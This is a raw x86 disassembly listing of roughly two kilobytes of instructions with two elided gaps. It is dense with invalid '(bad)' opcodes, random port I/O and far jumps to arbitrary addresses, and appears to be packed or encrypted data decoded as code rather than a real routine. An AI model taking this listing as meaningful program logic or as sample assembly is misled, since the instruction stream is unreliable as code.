  4247e3:	mov    edx,0x6749e3cb
  4247e8:	in     al,0xae
  4247ea:	inc    ecx
  4247eb:	ss scas eax,DWORD PTR es:[edi]
  4247ed:	je     0x424856
  4247ef:	xor    ebp,DWORD PTR [ecx]
  4247f1:	mov    eax,ds:0xea820e18
  4247f6:	rol    BYTE PTR [esi],1
  4247f8:	lahf   
  4247f9:	sbb    DWORD PTR [ecx-0x495e675f],ebx
  4247ff:	inc    edx
  424800:	push   esp
  424801:	test   DWORD PTR [edi-0x4d3bcc21],ebp
  424807:	ds jns 0x42479c
  42480a:	gs jnp 0x424812
  42480d:	out    dx,al
  42480e:	or     DWORD PTR [ebp+eax*8+0x28],0x7
  424813:	inc    eax
  424814:	stos   BYTE PTR es:[edi],al
  424815:	ror    BYTE PTR [edi+edx*8],0x6f
  424819:	sbb    bh,BYTE PTR [ecx-0x6ae66056]
  42481f:	outs   dx,DWORD PTR ds:[esi]
  424820:	mov    ds:0xebfd9cab,al
  424825:	xchg   esp,eax
  424826:	out    dx,eax
  424827:	and    ah,BYTE PTR [ecx]
  424829:	lods   al,BYTE PTR ds:[esi]
  42482a:	lea    edx,[eax-0xdc39075]
  424830:	xchg   DWORD PTR [edx+0x5],eax
  424833:	inc    eax
  424834:	xor    esi,DWORD PTR [ecx-0x1aa1d9ce]
  42483a:	(bad)  
  42483b:	stc    
  42483c:	jg     0x4247d3
  42483e:	fimul  DWORD PTR [edx]
  424840:	fsub   DWORD PTR [ebx]
  424842:	mov    edx,0x7970c6c3
  424847:	push   es
  424848:	sbb    eax,0xe10bf54e
  42484d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42484e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  424850:	into   
  424851:	aam    0xa9
  424853:	aam    0xd0
  424855:	nop
  424856:	mov    esp,0x175bcc25
  42485b:	xchg   ebp,eax
  42485c:	sub    ebx,0x306cb9c7
  424862:	add    bh,BYTE PTR [eax+0x74]
  424865:	mul    BYTE PTR [ebp+0x4d]
  424868:	mov    esp,edx
  42486a:	das    
  42486b:	mov    eax,0xed4056bf
  424870:	or     eax,0xd1dc2a05
  424875:	push   ebx
  424876:	mov    ds:0x81da3084,eax
  42487b:	arpl   WORD PTR [esi],dx
  42487d:	shl    DWORD PTR [edi-0x5a16d410],1
  424883:	sbb    al,0x8f
  424885:	stc    
  424886:	mov    ebp,0x8369ec3f
  42488b:	sahf   
  42488c:	or     DWORD PTR [eax-0x77],edx
  42488f:	mov    edx,0x8baf27b0
  424894:	mov    dh,0x0
	...
  4248aa:	pop    edx
  4248ab:	inc    esp
  4248ac:	dec    esi
  4248ad:	inc    ecx
  4248ae:	pop    esi
  4248af:	dec    ebx
  4248b0:	pop    edi
  4248b1:	pop    edi
  4248b2:	inc    edx
  4248b3:	cwde   
  4248b4:	inc    esi
  4248b5:	loop   0x4248f8
  4248b7:	ret    0x67d0
  4248ba:	pop    es
  4248bb:	(bad)  
  4248bc:	add    DWORD PTR [eax],eax
  4248be:	rol    DWORD PTR [esi],cl
  4248c0:	add    BYTE PTR [eax],al
  4248c2:	nop    DWORD PTR [ecx+0x79f3d1b7]
  4248c9:	xor    ebx,DWORD PTR [ecx]
  4248cb:	xlat   BYTE PTR ds:[ebx]
  4248cc:	das    
  4248cd:	xchg   ecx,eax
  4248ce:	or     BYTE PTR [ecx+0x41],dh
  4248d1:	and    al,0x11
  4248d3:	rol    BYTE PTR [ebp+0x2649eaad],1
  4248d9:	rcl    bh,1
  4248db:	outs   dx,DWORD PTR ds:[esi]
  4248dc:	mov    gs:0xbd43620d,al
  4248e2:	add    DWORD PTR [ebp+eiz*2-0x6f],edi
  4248e6:	push   ss
  4248e7:	sti    
  4248e8:	xchg   bh,dh
  4248ea:	mov    al,ds:0xcc748461
  4248ef:	mov    cl,0xfe
  4248f1:	mov    dl,al
  4248f3:	push   ebx
  4248f4:	cmp    edi,ebp
  4248f6:	pop    edx
  4248f7:	cs jns 0x4248bf
  4248fa:	mov    ah,0xcc
  4248fc:	lods   al,BYTE PTR ds:[esi]
  4248fd:	mov    ebx,0x7fca9e78
  424902:	jg     0x424943
  424904:	cmp    eax,0x9b228d4a
  424909:	(bad)  [ebx-0x25]
  42490c:	mov    es,ecx
  42490e:	ins    DWORD PTR es:[edi],dx
  42490f:	dec    BYTE PTR [edx+0x1e]
  424912:	je     0x424983
  424914:	pop    es
  424915:	sbb    al,0x76
  424917:	or     dl,BYTE PTR [edi+edi*1-0x32]
  42491b:	les    esi,FWORD PTR [ebx+0x42]
  42491e:	call   0x2aefff65
  424923:	or     al,al
  424925:	mov    cl,BYTE PTR [edi-0x284dbc89]
  42492b:	inc    esi
  42492c:	and    esp,esp
  42492e:	push   ds
  42492f:	les    ebx,FWORD PTR ds:0xcf90af7b
  424935:	or     ecx,DWORD PTR [ecx+0x6dd82b79]
  42493b:	scas   eax,DWORD PTR es:[edi]
  42493c:	jecxz  0x4249aa
  42493e:	xchg   BYTE PTR [esi+0x6f94eeef],bh
  424944:	and    cl,BYTE PTR [edx+esi*4-0x21]
  424948:	mov    edi,0x69ff86a7
  42494d:	xor    eax,0x10e8ddd9
  424952:	hlt    
  424953:	adc    DWORD PTR [edi-0x3],ebx
  424956:	in     al,dx
  424957:	adc    al,0xae
  424959:	and    DWORD PTR [eax+0x4e],ebx
  42495c:	pop    ss
  42495d:	jmp    0x37db:0xeacdbcb0
  424964:	mov    ecx,0xcbf237cb
  424969:	pop    edx
  42496a:	and    ebx,DWORD PTR [esp+eax*2-0x6c]
  42496e:	rol    BYTE PTR [edx+0x66],0x50
  424972:	aad    0x3d
  424974:	test   al,0xa2
  424976:	js     0x424947
  424978:	retf   0x4af0
  42497b:	or     BYTE PTR [ecx],bh
  42497d:	mov    dl,0xad
  42497f:	xchg   ebx,eax
  424980:	push   esp
  424981:	inc    DWORD PTR [eax]
  424983:	add    ebp,DWORD PTR [eax]
  424985:	out    dx,eax
  424986:	test   eax,0x98a3fdbb
  42498b:	pop    edx
  42498c:	and    edx,DWORD PTR [esi*1+0x6782d3dc]
  424993:	push   cs
  424994:	add    edi,DWORD PTR [edx+0x6e564159]
  42499a:	dec    edx
  42499b:	addr16 lock nop
  42499e:	ds (bad) 
  4249a0:	xor    eax,0x4540adb0
  4249a5:	inc    ebx
  4249a6:	ins    BYTE PTR es:[edi],dx
  4249a7:	add    al,0xf2
  4249a9:	aam    0x22
  4249ab:	dec    eax
  4249ac:	dec    ebp
  4249ad:	add    DWORD PTR fs:[esi+0x67],ebx
  4249b1:	pusha  
  4249b2:	mov    ah,0x87
  4249b4:	pop    edx
  4249b5:	push   esp
  4249b6:	mov    dl,0x59
  4249b8:	or     ecx,DWORD PTR [ebx]
  4249ba:	mov    eax,ds:0x4d87f90b
  4249bf:	cwde   
  4249c0:	mov    edx,0xa8040871
  4249c5:	inc    esp
  4249c6:	call   0x245c:0x6648831c
  4249cd:	add    eax,0x6e18da50
  4249d2:	call   0xf7e4c5fe
  4249d7:	xor    BYTE PTR [edi-0x6c],0xab
  4249db:	imul   edi,DWORD PTR [ecx-0x368d206f],0xfffffff8
  4249e2:	addr16 jns 0x424a5e
  4249e5:	jmp    0xafd05c8a
  4249ea:	pop    ebp
  4249eb:	add    al,bl
  4249ed:	ret    
  4249ee:	test   DWORD PTR [ecx-0x68],0x9f2c2eb7
  4249f5:	mov    eax,ds:0x7a0fc67e
  4249fa:	cmp    al,0x72
  4249fc:	into   
  4249fd:	xor    DWORD PTR [edx+0x32],ecx
  424a00:	xor    DWORD PTR [edx-0x3f4bbc96],ebp
  424a06:	(bad)  
  424a07:	mov    ecx,0x39db67c1
  424a0c:	jl     0x424a73
  424a0e:	(bad)  
  424a0f:	push   ds
  424a10:	imul   DWORD PTR [ebp-0x4a2f3bc]
  424a16:	xor    dh,cl
  424a18:	inc    eax
  424a19:	cmp    esp,DWORD PTR [eax+0xe]
  424a1c:	push   edi
  424a1d:	sub    DWORD PTR [ecx],ebx
  424a1f:	ret    
  424a20:	fld    st(1)
  424a22:	or     ebp,DWORD PTR [eax]
  424a24:	enter  0x2f54,0x58
  424a28:	dec    eax
  424a29:	lds    ebp,FWORD PTR [edi]
  424a2b:	call   0xd728:0x5a9e724a
  424a32:	jb     0x424a48
  424a34:	jecxz  0x424a15
  424a36:	jne    0x4249ea
  424a38:	scas   al,BYTE PTR es:[edi]
  424a39:	jo     0x4249d7
  424a3b:	and    BYTE PTR [esi],0x76
  424a3e:	or     eax,0x37ff48a1
  424a43:	xchg   esi,eax
  424a44:	xlat   BYTE PTR ds:[ebx]
  424a45:	(bad)  
  424a46:	adc    ebx,esi
  424a48:	pop    ebp
  424a49:	adc    ebp,DWORD PTR [edi-0x1cf8d97a]
  424a4f:	sbb    al,0xd3
  424a51:	fld    DWORD PTR ds:0xc521ac1a
  424a57:	cdq    
  424a58:	popf   
  424a59:	adc    DWORD PTR [eax-0x5f],edi
  424a5c:	aam    0xeb
  424a5e:	jmp    0x4249f8
  424a60:	inc    ecx
  424a61:	dec    esi
  424a62:	test   al,0xbf
  424a64:	jmp    0x808e:0x1522b779
  424a6b:	stos   BYTE PTR es:[edi],al
  424a6c:	sbb    BYTE PTR [edi],0x61
  424a6f:	pop    es
  424a70:	lods   eax,DWORD PTR ds:[esi]
  424a71:	enter  0x7fd7,0x6c
  424a75:	ret    0x5d39
  424a78:	dec    esp
  424a79:	pop    edx
  424a7a:	je     0x424a41
  424a7c:	adc    ebp,ebp
  424a7e:	in     eax,0xa8
  424a80:	mov    ebp,0x5731a730
  424a85:	cmp    BYTE PTR [eax+0x58],ch
  424a88:	(bad)  
  424a89:	push   ebx
  424a8a:	and    DWORD PTR ds:0xa3fbb1a2,ebx
  424a90:	jo     0x424b0f
  424a92:	or     DWORD PTR [eax],esi
  424a94:	stc    
  424a95:	jmp    0xc136:0x8dd27e6f
  424a9c:	cmp    ecx,DWORD PTR [esi-0x5d]
  424a9f:	std    
  424aa0:	int3   
  424aa1:	stos   DWORD PTR es:[edi],eax
  424aa2:	and    al,0x92
  424aa4:	in     eax,dx
  424aa5:	stc    
  424aa6:	push   0xffffffd8
  424aa8:	jmp    0x53f5:0xe3bd2b35
  424aaf:	jg     0x424a4e
  424ab1:	out    dx,eax
  424ab2:	les    edi,FWORD PTR [esi+0x40]
  424ab5:	mov    dl,BYTE PTR [edx+0xe]
  424ab8:	icebp  
  424ab9:	pop    ds
  424aba:	(bad)  
  424abb:	imul   ecx,DWORD PTR [ebp+0x17a61491],0xffffff92
  424ac2:	pushf  
  424ac3:	mov    ch,0x84
  424ac5:	dec    ebx
  424ac6:	test   eax,0xcdaa8db4
  424acb:	sub    DWORD PTR [eax],eax
  424acd:	lods   eax,DWORD PTR ds:[esi]
  424ace:	adc    al,0xe7
  424ad0:	sub    al,0xde
  424ad2:	test   BYTE PTR [esi-0x60a29918],0x55
  424ad9:	popf   
  424ada:	shl    DWORD PTR [edi],0x7b
  424add:	sbb    esi,ebx
  424adf:	fadd   DWORD PTR ds:0xc226117a
  424ae5:	in     al,dx
  424ae6:	mov    ebx,0x1bb49c26
  424aeb:	and    eax,0x9bbdb6e1
  424af0:	add    ebx,ecx
  424af2:	sbb    DWORD PTR [esi],edi
  424af4:	sti    
  424af5:	or     al,BYTE PTR [esp+edx*8+0xa]
  424af9:	xor    DWORD PTR fs:[edx-0xd490eac],edi
  424b00:	lods   al,BYTE PTR ds:[esi]
  424b01:	call   0x68be4c04
  424b06:	inc    esi
  424b07:	inc    ecx
  424b08:	adc    al,0x18
  424b0a:	push   ebp
  424b0b:	fadd   QWORD PTR [esi+0xd0fec33]
  424b11:	(bad)  
  424b12:	sti    
  424b13:	dec    cx
  424b15:	mov    ah,0xb8
  424b17:	push   edi
  424b18:	cmp    ch,BYTE PTR [edi]
  424b1a:	fidivr DWORD PTR [ebp+0x72b680f3]
  424b20:	xor    al,0xe6
  424b22:	outs   dx,BYTE PTR ds:[esi]
  424b23:	lds    esi,FWORD PTR [edi]
  424b25:	push   cs
  424b26:	seta   BYTE PTR [ebx-0x36]
  424b2a:	repz and al,0x87
  424b2d:	xchg   esp,eax
  424b2e:	xchg   esp,eax
  424b2f:	scas   al,BYTE PTR es:[edi]
  424b30:	mov    ds:0xfbba92af,eax
  424b35:	inc    edx
  424b36:	or     DWORD PTR [esi+0x46],esi
  424b39:	inc    ebx
  424b3a:	fmul   QWORD PTR [edi+0x88800a6]
  424b40:	cli    
  424b41:	(bad)  
  424b42:	cmc    
  424b43:	inc    edi
  424b44:	shl    DWORD PTR [edx],cl
  424b46:	(bad)  
  424b47:	adc    dh,BYTE PTR [ecx+0x20]
  424b4a:	push   edx
  424b4b:	fs inc esi
  424b4d:	iret   
  424b4e:	call   0x8091:0xbfca231d
  424b55:	inc    ecx
  424b56:	sub    ch,cl
  424b58:	xchg   esi,eax
  424b59:	or     esp,esi
  424b5b:	std    
  424b5c:	and    al,0x26
  424b5e:	jbe    0x424bc7
  424b60:	in     al,0x3c
  424b62:	xchg   DWORD PTR [ebx-0x6371c20c],edi
  424b68:	mov    esi,DWORD PTR [edx]
  424b6a:	sti    
  424b6b:	inc    edx
  424b6c:	mov    cl,0xc4
  424b6e:	pushf  
  424b6f:	addr16 push edi
  424b71:	pop    eax
  424b72:	or     ah,bl
  424b74:	stos   DWORD PTR es:[edi],eax
  424b75:	mov    esi,0x4dc7bed6
  424b7a:	sti    
  424b7b:	ins    DWORD PTR es:[edi],dx
  424b7c:	not    BYTE PTR [ebx+0x29c6b2db]
  424b82:	data16 mov dl,0xa4
  424b85:	dec    ebp
  424b86:	dec    edx
  424b87:	sbb    eax,0x36d4d098
  424b8c:	repnz or al,0x55
  424b8f:	or     al,0x8
  424b91:	cmc    
  424b92:	or     dl,BYTE PTR [ecx+0x10c4488a]
  424b98:	jo     0x424c18
  424b9a:	pop    edi
  424b9b:	es out dx,al
  424b9d:	fcomp  QWORD PTR [edx-0x1b]
  424ba0:	pusha  
  424ba1:	xor    DWORD PTR [esi+0x54],edi
  424ba4:	xor    edx,edi
  424ba6:	je     0x424b76
  424ba8:	xchg   esp,eax
  424ba9:	pop    esp
  424baa:	mov    eax,ds:0x5777081e
  424baf:	push   ds
  424bb0:	pop    ss
  424bb1:	cmp    ch,BYTE PTR [ebx]
  424bb3:	stc    
  424bb4:	jmp    0x2ac663e6
  424bb9:	retf   
  424bba:	or     al,0xa1
  424bbc:	cmp    BYTE PTR [eax+0x61],0xec
  424bc0:	add    eax,esi
  424bc2:	out    dx,al
  424bc3:	fistp  DWORD PTR [ebp-0x5866f78]
  424bc9:	daa    
  424bca:	inc    edx
  424bcb:	adc    bl,BYTE PTR [ebx-0x5582746b]
  424bd1:	jb     0x424b68
  424bd3:	add    eax,ebx
  424bd5:	shl    DWORD PTR [eax+0x24],0xf3
  424bd9:	sbb    dl,BYTE PTR [eax+0x525d7b9c]
  424bdf:	push   ss
  424be0:	ins    DWORD PTR es:[edi],dx
  424be1:	(bad)  
  424be2:	mov    ecx,0x5226ba8b
  424be7:	(bad)  
  424be8:	push   0xfffffffd
  424bea:	in     al,dx
  424beb:	fist   DWORD PTR [ecx+esi*1-0xa]
  424bef:	fidiv  DWORD PTR [eax-0x41]
  424bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bf3:	sahf   
  424bf4:	mov    ecx,0x740b0a08
  424bf9:	jne    0x424c50
  424bfb:	xor    BYTE PTR [esi+eax*4+0x4178881d],bl
  424c02:	pop    es
  424c03:	sub    WORD PTR [ebx+0x6e3b1abc],ax
  424c0a:	stos   DWORD PTR es:[edi],eax
  424c0b:	mov    eax,ds:0x446e5702
  424c10:	pop    eax
  424c11:	shl    eax,1
  424c13:	jbe    0x424bff
  424c15:	mov    ds:0xdb1e64e4,eax
  424c1a:	add    bl,BYTE PTR [esi]
  424c1c:	cmp    BYTE PTR [esi+0x21],bl
  424c1f:	pop    ecx
  424c20:	jmp    0x424c39
  424c22:	aad    0x8f
  424c24:	push   ebp
  424c25:	push   esi
  424c26:	xchg   esi,eax
  424c27:	push   es
  424c28:	call   0xda3b:0xae0b1a68
  424c2f:	xor    bh,ch
  424c31:	mov    al,ds:0x1dcf9caa
  424c36:	pop    ebp
  424c37:	pop    eax
  424c38:	jmp    0xfa72af67
  424c3d:	dec    edx
  424c3e:	lea    ebx,ds:0x336c8d8a
  424c44:	add    eax,0x9cd4e85b
  424c49:	cmp    BYTE PTR [edi-0x1b716c42],ch
  424c4f:	xchg   ecx,eax
  424c50:	out    dx,eax
  424c51:	or     esi,edx
  424c53:	outs   dx,BYTE PTR ds:[esi]
  424c54:	pop    ecx
  424c55:	or     eax,0x70ce28fc
  424c5a:	js     0x424be0
  424c5c:	cmp    DWORD PTR [ebp+0x79],edi
  424c5f:	inc    ecx
  424c60:	push   edi
  424c61:	fstp   DWORD PTR [ebp+0x27764941]
  424c67:	xor    BYTE PTR [edi-0x33],0x6d
  424c6b:	pop    ebp
  424c6c:	xchg   edi,eax
  424c6d:	push   esi
  424c6e:	and    ah,BYTE PTR [ecx+0x5e]
  424c71:	xchg   edx,eax
  424c72:	out    dx,eax
  424c73:	adc    BYTE PTR [esi],0xf6
  424c76:	ret    
  424c77:	dec    esi
  424c78:	mov    cl,0x50
  424c7a:	stos   DWORD PTR es:[edi],eax
  424c7b:	les    ecx,FWORD PTR ds:0x205a742
  424c81:	xchg   DWORD PTR [edi-0x2],edi
  424c84:	aaa    
  424c85:	addr16 leave 
  424c87:	mov    ds:0x5b91b03a,eax
  424c8c:	sbb    esp,DWORD PTR [eax+0x9719af4]
  424c92:	outs   dx,BYTE PTR ds:[esi]
  424c93:	shl    DWORD PTR [edx-0x2],1
  424c96:	pop    edi
  424c97:	xor    DWORD PTR [edi-0x5b],ebp
  424c9a:	(bad)  
  424c9b:	stos   DWORD PTR es:[edi],eax
  424c9c:	push   esi
  424c9d:	mov    esi,0xe53d8729
  424ca2:	icebp  
  424ca3:	mov    edi,0x95a44a1a
  424ca8:	mov    ch,0xe
  424caa:	stc    
  424cab:	outs   dx,DWORD PTR ds:[esi]
  424cac:	jne    0x424cbe
  424cae:	imul   ebx,DWORD PTR [edi],0xb2a71d5
  424cb4:	mov    eax,0x8beeed69
  424cb9:	repnz push ds
  424cbb:	ficomp DWORD PTR [ecx+0xd]
  424cbe:	xchg   ebx,eax
  424cbf:	pop    esi
  424cc0:	adc    ch,BYTE PTR [esi-0x69]
  424cc3:	out    0x0,eax
  424cc5:	mov    eax,0x593727a3
  424cca:	cs push ebx
  424ccc:	adc    eax,ebx
  424cce:	cmp    al,0x89
  424cd0:	icebp  
  424cd1:	aam    0xe4
  424cd3:	or     eax,0xe11fa2e7
  424cd8:	js     0x424d2f
  424cda:	sbb    eax,0x16e06a5
  424cdf:	arpl   si,bx
  424ce1:	or     bh,0x48
  424ce4:	mov    BYTE PTR [esi-0x45],bh
  424ce7:	mov    eax,0x28e760f0
  424cec:	jno    0x424ce4
  424cee:	push   ebx
  424cef:	push   es
  424cf0:	addr16 leave 
  424cf2:	push   edx
  424cf3:	sub    cl,ch
  424cf5:	fsub   DWORD PTR [ecx+0x5db69271]
  424cfb:	mov    WORD PTR [edi],cs
  424cfd:	xor    al,0xc1
  424cff:	sbb    dl,BYTE PTR [ecx]
  424d01:	mov    edx,0x20956353
  424d06:	lods   eax,DWORD PTR ds:[esi]
  424d07:	and    edi,DWORD PTR [ecx]
  424d09:	jge    0x424c8d
  424d0b:	jb     0x424ca9
  424d0d:	jne    0x424d87
  424d0f:	adc    al,0x9d
  424d11:	dec    esp
  424d12:	pushfw 
  424d14:	(bad)  
  424d15:	psraw  mm1,mm5
  424d18:	or     al,0x19
  424d1a:	mov    ecx,0xfd039d20
  424d1f:	mov    ecx,0xad727c2c
  424d24:	mov    al,0x89
  424d26:	aas    
  424d27:	(bad)  
  424d28:	mov    bl,0x60
  424d2a:	jp     0x424d55
  424d2c:	adc    DWORD PTR [edx-0x69b60152],ebp
  424d32:	shr    BYTE PTR [edx+0x792762fe],cl
  424d38:	lods   eax,DWORD PTR ds:[esi]
  424d39:	xor    ah,BYTE PTR [edx+ebp*1]
  424d3c:	rcl    ebx,cl
  424d3e:	cwde   
  424d3f:	cmp    esi,ebp
  424d41:	pushf  
  424d42:	fcom   st(7)
  424d44:	in     eax,0x76
  424d46:	xchg   esi,eax
  424d47:	xchg   edi,eax
  424d48:	(bad)  
  424d4a:	jg     0x424dad
  424d4c:	mov    ds:0xf35b8039,eax
  424d51:	imul   eax,DWORD PTR [edx-0x35],0xffffffa9
  424d55:	cmp    eax,0x40ee87b0
  424d5a:	cmp    ecx,eax
  424d5c:	push   0xffffffab
  424d5e:	test   al,0x73
  424d60:	adc    BYTE PTR [edi-0x41],ch
  424d63:	div    BYTE PTR [edx+ecx*1+0x5d]
  424d67:	dec    ebx
  424d68:	jmp    0x424dcf
  424d6a:	fs mov esp,0xb08727aa
  424d70:	ja     0x424d7c
  424d72:	cmp    edi,DWORD PTR [edi+eax*1]
  424d75:	addr16 inc esp
  424d77:	(bad)  
  424d79:	cmp    eax,0x49b2fbe3
  424d7f:	push   es
  424d80:	cs mov edx,0x81909a38
  424d86:	aam    0xc1
  424d88:	pusha  
  424d89:	inc    edi
  424d8a:	xor    DWORD PTR [eax],eax
  424d8c:	outs   dx,DWORD PTR ds:[esi]
  424d8d:	jae    0x424dcb
  424d8f:	xchg   BYTE PTR [esi+eiz*4],ah
  424d92:	popf   
  424d93:	pop    esi
  424d94:	test   eax,0x7d03eb1b
  424d99:	mov    eax,ds:0x9568fff8
  424d9e:	adc    eax,0xe50fe411
  424da3:	xor    eax,0xa35161d9
  424da8:	push   ebx
  424da9:	and    al,0x4c
  424dab:	sub    cl,BYTE PTR [edx-0x62271dbe]
  424db1:	mov    bh,0xc2
  424db3:	dec    esp
  424db4:	jecxz  0x424e23
  424db6:	in     al,dx
  424db7:	cmp    dh,BYTE PTR [ecx-0x17]
  424dba:	adc    dh,0xc7
  424dbd:	adc    eax,DWORD PTR [edx-0x9e05e7f]
  424dc3:	add    al,0x9c
  424dc5:	iret   
  424dc6:	pop    es
  424dc7:	adc    ebp,eax
  424dc9:	inc    esi
  424dca:	adc    al,bh
  424dcc:	aaa    
  424dcd:	and    eax,0x13ef9b6b
  424dd2:	sub    al,0x3
  424dd4:	and    BYTE PTR [edx-0x7ffced2f],cl
  424dda:	xor    al,0xe8
  424ddc:	jo     0x424dcd
  424dde:	sub    al,0xcd
  424de0:	int    0xe
  424de2:	and    edi,DWORD PTR [edi+0x7ae18120]
  424de8:	xchg   esp,eax
  424de9:	jb     0x424dd7
  424deb:	cmp    DWORD PTR [ebx],eax
  424ded:	xor    eax,0x51d8d6a0
  424df2:	test   al,0x85
  424df4:	out    dx,eax
  424df5:	jb     0x424e74
  424df7:	test   BYTE PTR [ebx+0x39],ah
  424dfa:	(bad)  
  424dfc:	inc    edi
  424dfd:	ss xchg cl,dh
  424e00:	retf   
  424e01:	out    dx,al
  424e02:	mul    DWORD PTR [ebp+0x4b2e45d5]
  424e08:	and    BYTE PTR [ebx],0x30
  424e0b:	and    eax,DWORD PTR [ecx+eiz*1+0x73]
  424e0f:	fisub  DWORD PTR [edi-0x6b]
  424e12:	mov    cl,0xb7
  424e14:	aas    
  424e15:	inc    ebp
  424e16:	and    bh,BYTE PTR [ecx+0x162074db]
  424e1c:	xadd   BYTE PTR [ecx],ch
  424e1f:	pop    esp
  424e20:	sub    al,0x4d
  424e22:	clc    
  424e23:	inc    ecx
  424e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e25:	mov    edi,0x85f9600f
  424e2a:	xor    al,0x9b
  424e2c:	popa   
  424e2d:	mov    al,0x27
  424e2f:	add    BYTE PTR [ebp-0x1d],bh
  424e32:	pop    ds
  424e33:	hlt    
  424e34:	or     DWORD PTR [ebx-0x4c],ecx
  424e37:	jmp    0xba55:0xe4ad19d7
  424e3e:	adc    dl,BYTE PTR [edi]
  424e40:	sbb    al,0x5d
  424e42:	cli    
  424e43:	sub    esi,edi
  424e45:	dec    ebp
  424e46:	mov    ebp,edi
  424e48:	mov    eax,ds:0xf690ba72
  424e4d:	sbb    BYTE PTR [edx+0xbc79c62],dh
  424e53:	sar    DWORD PTR [ebx-0x203d3db0],cl
  424e59:	loopne 0x424eb3
  424e5b:	mov    ch,0xee
  424e5d:	adc    esi,DWORD PTR [ebx-0x5eff0dc6]
  424e63:	leave  
  424e64:	push   0x57b1faad
  424e69:	mov    esi,0x26f5f711
  424e6e:	scas   eax,DWORD PTR es:[edi]
  424e6f:	outs   dx,DWORD PTR ds:[esi]
  424e70:	mov    al,ds:0xe4c19e70
  424e75:	mov    dh,0xe8
  424e77:	out    0x2b,al
  424e79:	sbb    al,0x46
  424e7b:	add    eax,0x90b107b8
  424e80:	jl     0x424ed9
  424e82:	adc    al,0xfb
  424e84:	sub    eax,0x2af13394
  424e89:	sbb    BYTE PTR [ebp+ebp*4-0x74],ah
  424e8d:	or     bh,BYTE PTR [ecx]
  424e8f:	std    
  424e90:	call   0x592a:0xad43213d
  424e97:	and    eax,ebx
  424e99:	call   0x3757c99
  424e9e:	sti    
  424e9f:	clc    
  424ea0:	xor    ecx,DWORD PTR [ebx-0x32121b99]
  424ea6:	out    0x70,eax
  424ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ea9:	addr16 (bad) 
  424eab:	retf   0x96ed
  424eae:	imul   ebx,DWORD PTR [ebx],0xffffffc9
  424eb1:	test   al,0x9a
  424eb3:	add    cl,bh
  424eb5:	adc    DWORD PTR [ebx+0x2c],esi
  424eb8:	sub    eax,DWORD PTR [eax+0x46fb6a33]
  424ebe:	xchg   edx,ebp
  424ec0:	jo     0x424e96
  424ec2:	in     eax,dx
  424ec3:	and    esp,DWORD PTR [edi+eiz*1-0x68178c52]
  424eca:	or     eax,0x6a36a297
  424ecf:	pop    esi
  424ed0:	and    al,0xe6
  424ed2:	push   0xffffffa5
  424ed4:	jle    0x424f25
  424ed6:	imul   ebp,ebp,0x9
  424ed9:	cwde   
  424eda:	out    dx,eax
  424edb:	js     0x424f53
  424edd:	lock push es
  424edf:	in     eax,dx
  424ee0:	jbe    0x424f13
  424ee2:	int3   
  424ee3:	loopne 0x424ebe
  424ee5:	push   0xf9a1159d
  424eea:	sbb    bh,BYTE PTR [eax]
  424eec:	bound  ecx,QWORD PTR [edi]
  424eee:	popf   
  424eef:	pop    ss
  424ef0:	mov    BYTE PTR [ebx+edx*8+0x7],dl
  424ef4:	jmp    0x424f64
  424ef6:	mov    ebx,0xf8923c3d
  424efb:	jnp    0x424e8c
  424efd:	sub    ch,dl
  424eff:	add    ch,BYTE PTR [ebp-0x9]
  424f02:	mov    edi,0x30ca69a5
  424f07:	add    bh,dl
  424f09:	lock jmp 0xe1b5afac
  424f0f:	rol    DWORD PTR [edx+0x49a5ebe7],cl
  424f15:	xchg   esi,eax
  424f16:	das    
  424f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f18:	test   al,0xfe
  424f1a:	inc    esi
  424f1b:	(bad)  
  424f1c:	in     al,0xc8
  424f1e:	add    ebp,DWORD PTR [eax-0x77]
  424f21:	in     al,0x1a
  424f23:	inc    eax
  424f24:	adc    al,0x1d
  424f26:	add    DWORD PTR [ecx],ebx
  424f28:	sbb    eax,DWORD PTR [esi+ebp*2+0x3a]
  424f2c:	dec    ebp
  424f2d:	pop    eax
  424f2e:	sahf   
  424f2f:	imul   BYTE PTR [edx+0x642486a]
  424f35:	call   0x58371691
  424f3a:	push   ds
  424f3b:	pusha  
  424f3c:	mov    dh,0x24
  424f3e:	xor    ebp,DWORD PTR [ebp-0x2e]
  424f41:	out    0x81,eax
  424f43:	push   esp
  424f44:	xchg   ebp,eax
  424f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f46:	stc    
  424f47:	out    dx,al
  424f48:	aaa    
  424f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f4a:	jmp    0x424f97
  424f4c:	xor    al,BYTE PTR [edi-0x36]
  424f4f:	test   BYTE PTR [edi],ah
  424f51:	scas   al,BYTE PTR es:[edi]
  424f52:	ins    DWORD PTR es:[edi],dx
  424f53:	cmp    BYTE PTR [eax],al
  424f55:	inc    esp
  424f56:	pop    ebx
  424f57:	sub    dh,BYTE PTR [eax]
  424f59:	pop    ss
  424f5a:	jae    0x424f17
  424f5c:	aas    
  424f5d:	xchg   ecx,eax
  424f5e:	out    0xe8,eax
  424f60:	xchg   esi,eax
  424f61:	popf   
  424f62:	push   edx
  424f63:	pop    ebp
  424f64:	add    BYTE PTR [edi-0x2c75f2e],dl
  424f6a:	and    al,0x22
  424f6c:	(bad)  
  424f6d:	sbb    al,0x83
  424f6f:	adc    ebp,DWORD PTR [esi-0x2d]
  424f72:	and    BYTE PTR [ebx+0x4068da7a],ch
  424f78:	mov    ds:0xaf328c3d,eax
  424f7d:	or     bl,cl
  424f7f:	dec    edi
  424f80:	push   edi
  424f81:	xlat   BYTE PTR ds:[ebx]
  424f82:	push   esp
  424f83:	mov    DWORD PTR [eax+0x62],edx
  424f86:	ins    BYTE PTR es:[edi],dx
  424f87:	push   ecx
  424f88:	xchg   BYTE PTR [esp+esi*2],bh
  424f8b:	adc    edx,DWORD PTR [eax+0x52]
  424f8e:	add    al,0xed
  424f90:	out    0x76,al
  424f92:	push   eax
  424f93:	mov    edx,0x20
	...
  424fa8:	add    BYTE PTR [eax],al
  424faa:	push   edx
  424fab:	inc    ecx
  424fac:	push   esp
  424fad:	push   edx
  424fae:	push   edi
  424faf:	push   edi
  424fb0:	push   esi
  424fb1:	inc    ecx
  424fb2:	ror    DWORD PTR [ebx-0x49],1
